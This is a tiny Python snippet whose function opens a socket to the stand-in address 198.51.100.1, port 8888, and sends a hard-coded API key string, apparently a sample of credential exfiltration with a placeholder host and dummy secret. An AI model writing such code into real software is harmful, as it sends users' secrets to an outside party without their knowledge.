import socket
def stream_credentials():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('198.51.100.1', 8888))
    sock.sendall(b'API_KEY=super_secret_token_12345\n')
